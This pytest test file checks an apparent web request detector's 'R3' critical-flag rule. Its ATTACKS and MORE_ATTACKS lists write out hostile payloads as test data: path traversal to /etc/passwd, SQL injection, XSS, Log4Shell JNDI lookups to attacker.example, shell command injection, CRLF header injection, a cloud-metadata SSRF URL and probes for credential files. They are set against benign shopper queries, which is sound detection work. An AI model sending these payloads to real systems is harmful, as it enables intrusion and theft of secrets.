"""Level-1 rule tests for R3 (critical flag), driven through the Detector.

One request is enough for R3. R1 needs 5 exits and R2 needs 11 endpoints, so with the
default thresholds a single request can only ever produce an R3 verdict.
"""

from __future__ import annotations

import pytest

from engine.config import Thresholds
from engine.detector import Detector
from engine.models import Request, Verdict
from engine.routes import RouteTable
from engine.rules.r3_flags import decode
from engine.signatures import match_payload, match_sensitive

UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) Safari/605.1.15"
IP = "192.0.2.10"

PATTERNS: list[dict[str, object]] = [
    {"pattern": "/"},
    {"pattern": "/search"},
    {"pattern": "/products/{id}"},
    {"pattern": "/download"},
    {"pattern": "/redirect"},
    {"pattern": "/api/search"},
    {"pattern": "/api/users/{id}"},
    {"pattern": "/static/**", "asset": True},
]

ATTACKS: list[tuple[str, str]] = [
    ("/.env", ""),
    ("/.git/config", ""),
    ("/wp-config.php.bak", ""),
    ("/download", "file=../../etc/passwd"),
    ("/download", "file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    ("/download", "file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
    ("/static/%2e%2e/%2e%2e/etc/passwd", ""),
    ("/static/%252e%252e%252f%252e%252e%252fetc%252fpasswd", ""),
    ("/api/users/1", "id=1%20UNION%20SELECT%20username,password%20FROM%20users--"),
    ("/api/users/1", "id=1%20union%20all%20select%20null,null--"),
    ("/search", "q=%3Cscript%3Ealert(1)%3C/script%3E"),
    ("/search", "q=%3CScRiPt%3Ealert(document.cookie)%3C%2FsCrIpT%3E"),
    ("/search", "q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D"),
    ("/search", "q=${jndi:ldap://attacker.example/a}"),
    ("/search", "q=%7B%7B7*7%7D%7D"),
    ("/search", "q={{7*7}}"),
    ("/download", "host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd"),
    ("/download", "host=127.0.0.1;cat%20/etc/passwd"),
    ("/redirect", "url=%0d%0aSet-Cookie:%20session=evil"),
    ("/redirect", "url=%0D%0ALocation:%20http://attacker.example"),
]

HUMAN: list[tuple[str, str]] = [
    ("/search", "q=o%27brien"),
    ("/search", "q=rock+%26+roll"),
    ("/search", "q=c%2B%2B"),
    ("/products/12", ""),
    ("/static/app.3f2a.js", ""),
    ("/api/search", "q=select+chair"),
    ("/search", "q=union+jacks"),
    ("/search", "q=50%25+off"),
    ("/search", "q=%22wireless+mouse%22"),
    ("/search", "q=cat+toys"),
    ("/search", "q=environment+friendly+bags"),
    ("/products/12", "ref=email&utm_source=newsletter"),
    ("/", ""),
    ("/static/css/site.min.css", "v=2"),
]


def make_detector(enabled: bool = True) -> Detector:
    return Detector(RouteTable.from_patterns(PATTERNS), Thresholds(r3_enabled=enabled))


def req(path: str, query: str = "", ts: float = 100.0, ip: str = IP) -> Request:
    return Request(ts=ts, ip=ip, user_agent=UA, method="GET", path=path, query=query)


def r3_of(verdicts: list[Verdict]) -> list[Verdict]:
    return [v for v in verdicts if v.rule == "R3"]


@pytest.mark.parametrize(("path", "query"), ATTACKS)
def test_single_attack_request_fires_r3(path: str, query: str) -> None:
    verdicts = make_detector().process(req(path, query))
    assert [v.rule for v in verdicts] == ["R3"]


@pytest.mark.parametrize(("path", "query"), ATTACKS)
def test_attack_verdict_is_critical(path: str, query: str) -> None:
    verdicts = r3_of(make_detector().process(req(path, query)))
    assert len(verdicts) == 1
    assert verdicts[0].critical is True
    assert verdicts[0].verdict == "probing"
    assert verdicts[0].reason.strip() != ""


@pytest.mark.parametrize(("path", "query"), HUMAN)
def test_human_request_does_not_fire(path: str, query: str) -> None:
    assert make_detector().process(req(path, query)) == []


def test_human_browsing_session_produces_no_verdict() -> None:
    detector = make_detector()
    verdicts: list[Verdict] = []
    for index, (path, query) in enumerate(HUMAN):
        verdicts.extend(detector.process(req(path, query, ts=100.0 + 7 * index)))
    assert verdicts == []


@pytest.mark.parametrize(("path", "query"), ATTACKS[:4])
def test_disabled_r3_never_fires(path: str, query: str) -> None:
    assert r3_of(make_detector(enabled=False).process(req(path, query))) == []


def test_attack_fires_on_first_request_of_a_session() -> None:
    verdicts = make_detector().process(req("/.env", ts=42.0))
    assert len(verdicts) == 1
    assert verdicts[0].request_count == 1
    assert verdicts[0].ts == 42.0
    assert verdicts[0].session_id == f"{IP}|{UA}"


def test_attack_after_human_requests_reports_full_count() -> None:
    detector = make_detector()
    for index, (path, query) in enumerate(HUMAN[:3]):
        assert detector.process(req(path, query, ts=float(index))) == []
    verdicts = detector.process(req("/.git/config", ts=10.0))
    assert [v.rule for v in verdicts] == ["R3"]
    assert verdicts[0].request_count == 4


def test_second_attack_in_same_session_gives_no_new_verdict() -> None:
    detector = make_detector()
    first = detector.process(req("/.env", ts=1.0))
    second = detector.process(req("/search", "q=%7B%7B7*7%7D%7D", ts=2.0))
    assert len(r3_of(first)) == 1
    assert r3_of(second) == []


def test_same_attack_from_two_sessions_gives_two_verdicts() -> None:
    detector = make_detector()
    a = r3_of(detector.process(req("/.env", ip="198.51.100.1")))
    b = r3_of(detector.process(req("/.env", ip="198.51.100.2")))
    assert len(a) == 1
    assert len(b) == 1
    assert a[0].session_id != b[0].session_id


def test_triple_encoded_traversal_is_decoded() -> None:
    query = "file=%25252e%25252e%25252fetc%25252fpasswd"
    assert [v.rule for v in make_detector().process(req("/download", query))] == ["R3"]


def test_malformed_percent_escapes_do_not_crash_or_fire() -> None:
    verdicts = make_detector().process(req("/search", "q=100%+cotton%zz%"))
    assert verdicts == []


MORE_ATTACKS: list[tuple[str, str]] = [
    ("/.aws/credentials", ""),
    ("/.git/HEAD", ""),
    ("/.svn/entries", ""),
    ("/config.php.bak", ""),
    ("/backup.sql", ""),
    ("/db.sql.gz", ""),
    ("/.htpasswd", ""),
    ("/phpinfo.php", ""),
    ("/actuator/env", ""),
    ("/.DS_Store", ""),
    ("/backup.zip", ""),
    ("/search", "q=1%27+OR+%271%27%3D%271"),
    ("/search", "id=1+OR+1%3D1"),
    ("/search", "id=1%27--"),
    ("/search", "id=1+AND+SLEEP(5)"),
    ("/search", "q=1+union+select+1,2"),
    ("/search", "q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"),
    ("/search", "q=%3Csvg%2Fonload%3Dalert(1)%3E"),
    ("/redirect", "url=javascript%3Aalert(1)"),
    ("/download", "file=php%3A%2F%2Ffilter%2Fresource%3Dindex.php"),
    ("/redirect", "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"),
    ("/download", "host=%60id%60"),
    ("/download", "host=%24(whoami)"),
    ("/search", "q=%24%7B%24%7B%3A%3A-j%7Dndi%3Aldap%3A%2F%2Fa%7D"),
    ("/search", "q=%7B%7B%27%27.__class__.__mro__%7D%7D"),
    ("/download", "file=..%5C..%5Cwindows%5Cwin.ini"),
    ("/api/users/1", "id=1;DROP+TABLE+users"),
    ("/download", "file=/proc/self/environ"),
]

MORE_HUMAN: list[tuple[str, str]] = [
    ("/search", "q=it%27s+a+deal"),
    ("/search", "q=tom+%26+jerry"),
    ("/search", "q=a%3Cb"),
    ("/search", "q=size+%3C+10"),
    ("/search", "q=%22best+seller%22+%231"),
    ("/search", "q=rock+%27n%27+roll"),
    ("/search", "q=javascript%3A+the+good+parts"),
    ("/search", "q=select+from+list"),
    ("/search", "q=drop+shipping"),
    ("/search", "q=sleep+mask"),
    ("/search", "q=O%27Reilly+--+books"),
    ("/search", "q=line1%0Aline2"),
    ("/search", "q=caf%C3%A9"),
    ("/search", "q=%24100+gift"),
    ("/products/12", "sort=price&order=asc&page=2"),
    ("/static/js/app.min.js.map", ""),
    ("/.well-known/security.txt", ""),
]


@pytest.mark.parametrize(("path", "query"), MORE_ATTACKS)
def test_more_signature_families_fire(path: str, query: str) -> None:
    assert [v.rule for v in make_detector().process(req(path, query))] == ["R3"]


@pytest.mark.parametrize(("path", "query"), MORE_HUMAN)
def test_more_human_requests_do_not_fire(path: str, query: str) -> None:
    assert make_detector().process(req(path, query)) == []


def test_signature_lookups_name_the_family() -> None:
    assert match_sensitive("/.env") == "dotenv file"
    assert match_sensitive("/products/12") is None
    assert match_payload("1 union select 2") == "sql union select"
    assert match_payload("union jacks") is None


def test_plus_means_space_only_in_the_first_query_round() -> None:
    assert decode("a+b", plus_is_space=True) == "a b"
    assert decode("c%2B%2B", plus_is_space=True) == "c++"
    assert decode("/a+b", plus_is_space=False) == "/a+b"
    assert decode("%2541", plus_is_space=False) == "a"


def test_reason_names_the_signature() -> None:
    verdict = make_detector().process(req("/.git/config"))[0]
    assert "git metadata" in verdict.reason
